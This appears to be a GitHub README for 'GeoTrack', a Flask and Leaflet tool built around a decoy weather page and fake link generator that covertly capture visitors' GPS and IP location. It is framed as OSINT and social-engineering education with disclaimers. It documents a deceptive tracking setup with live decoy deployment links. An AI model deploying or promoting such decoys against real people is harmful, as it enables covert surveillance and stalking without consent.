# 🌐 GeoTrack — Location Intelligence Platform

![GeoTrack](https://img.shields.io/badge/GeoTrack-00f5ff?style=for-the-badge&logo=googlemaps)
![Python](https://img.shields.io/badge/Python-3.8+-3776AB?style=for-the-badge&logo=python)
![Flask](https://img.shields.io/badge/Flask-Backend-000000?style=for-the-badge&logo=flask)
![Leaflet](https://img.shields.io/badge/Leaflet.js-Maps-199900?style=for-the-badge&logo=leaflet)
![Google Maps](https://img.shields.io/badge/Google-Satellite-4285F4?style=for-the-badge&logo=googlemaps)
![License](https://img.shields.io/badge/License-Educational_Only-ff3c6e?style=for-the-badge)

> ⚠️ **ETHICAL USE ONLY** — This tool is built strictly for cybersecurity education, OSINT research, and ethical demonstrations. Unauthorized tracking is illegal. Always obtain explicit consent.

---

## 🔗 Live Demo

| | Link |
|---|---|
| 🌐 **Dashboard** | [https://ge0track.netlify.app](https://ge0track.netlify.app) |
| ⚙️ **Backend API** | [https://weatherforecast-live.up.railway.app](https://weatherforecast-live.up.railway.app) |
| 🌤️ **Fake Weather Page** | [https://weatherforecast-live.up.railway.app/forecast/world](https://weatherforecast-live.up.railway.app/forecast/world) |

---

## 📸 Features

| Feature | Description |
|---|---|
| 🗺️ **Map Tracker** | GPS + coordinate-based location mapping with reverse geocoding |
| 🛰️ **Normal / Satellite View** | Toggle between OpenStreetMap and Google Satellite on all 3 maps |
| 🔗 **Fake Link Generator** | Social engineering simulation — ngrok-powered WeatherNow decoy page |
| 🌐 **IP Lookup** | Full IP intelligence — city, ISP, timezone, org, coordinates on map |
| 📡 **Live Capture Log** | Auto-refresh every 5s — GPS + IP captures plotted on map in real time |
| 🌤️ **Fake Weather Page** | Convincing decoy page that silently captures GPS + IP location |
| 🔐 **Session Tokens** | Private captures — only your session can see your captured data |
| ✉️ **Contact Form** | EmailJS-powered — messages delivered directly to developer inbox |

---

## 🗂️ Project Structure

```
GeoTrack/
├── index.html        ← Frontend dashboard (single file, all pages)
├── server.py         ← Flask backend (REST API + fake weather page)
├── requirements.txt  ← Python dependencies
└── README.md
```

---

## ⚙️ Local Setup

### Step 1 — Clone the Repository

```bash
git clone https://github.com/harsh160311/Geo-Track
cd Geo-Track
```

### Step 2 — Install Dependencies

```bash
pip install flask flask-cors requests gunicorn
```

### Step 3 — Run the Server

```bash
python server.py
```

### Step 4 — Open the Dashboard

```
Open index.html in browser  OR  http://localhost:5000
```

---

## 📡 API Endpoints

| Endpoint | Method | Description |
|---|---|---|
| `/` | GET | Serves the main dashboard |
| `/forecast/world` | GET | Fake weather page (capture trigger) |
| `/api/ip` | GET | Returns caller's IP geolocation info |
| `/api/ip/<ip>` | GET | Lookup any specific IP address |
| `/api/reverse?lat=&lon=` | GET | Reverse geocode coordinates → address |
| `/api/session` | GET | Generate a private session token |
| `/api/capture` | POST | Save a captured location entry |
| `/api/captures?token=` | GET | Retrieve your session's captures |

---

## 🗺️ Map Features

| Map | Used On | Layers Available |
|---|---|---|
| **Tracker Map** | Tracker page | Normal (OSM) + Google Satellite |
| **IP Map** | IP Lookup page | Normal (OSM) + Google Satellite |
| **Capture Map** | Fake Link page | Normal (OSM) + Google Satellite |

- **Google Satellite** tiles — zoom up to level 21, works perfectly across India
- **ResizeObserver** — zoom and position preserved on any screen resize
- **GPS + IP fallback** — if GPS denied, IP-based location used automatically

---

## 🛠️ Tech Stack

| Layer | Technology |
|---|---|
| **Frontend** | HTML5, CSS3 (Cyberpunk Dark UI), Vanilla JavaScript ES6+ |
| **Maps** | Leaflet.js 1.9.4 + OpenStreetMap + Google Satellite Tiles |
| **Backend** | Python 3, Flask, Flask-CORS |
| **Geocoding** | Nominatim (OpenStreetMap Reverse Geocoding) |
| **IP Intelligence** | ip-api.com |
| **Tunneling** | pyngrok (ngrok Python wrapper) |
| **Contact Form** | EmailJS (client-side email delivery) |
| **Deployment** | Railway (backend) + Netlify (frontend) |

---

## ✉️ EmailJS Setup (Contact Form)

1. Register free at [emailjs.com](https://www.emailjs.com)
2. Add **Gmail service** → copy **Service ID**
3. Create **Email Template** with these variables:
   ```
   {{from_name}}   {{from_email}}   {{subject}}   {{message}}
   ```
   Copy **Template ID**
4. Go to **Account → General** → copy **Public Key**
5. Replace these 3 lines in `index.html`:

```js
var EJS_PK  = 'YOUR_PUBLIC_KEY';
var EJS_SID = 'YOUR_SERVICE_ID';
var EJS_TID = 'YOUR_TEMPLATE_ID';
```

---

## ⚠️ Legal Disclaimer

This project is created **strictly for educational purposes**:

- ✅ Cybersecurity awareness demonstrations
- ✅ OSINT research in controlled environments
- ✅ Personal learning and ethical hacking practice
- ❌ Tracking individuals without explicit consent
- ❌ Any unauthorized surveillance activity
- ❌ Illegal use of any kind

**Misuse of this tool is illegal and strictly prohibited.**

---

## 👩‍💻 Author

**Harsh** — Sirsa, Haryana, India  
Built with ❤️ for ethical cybersecurity education.

---

*GeoTrack © 2026 — Educational Use Only*
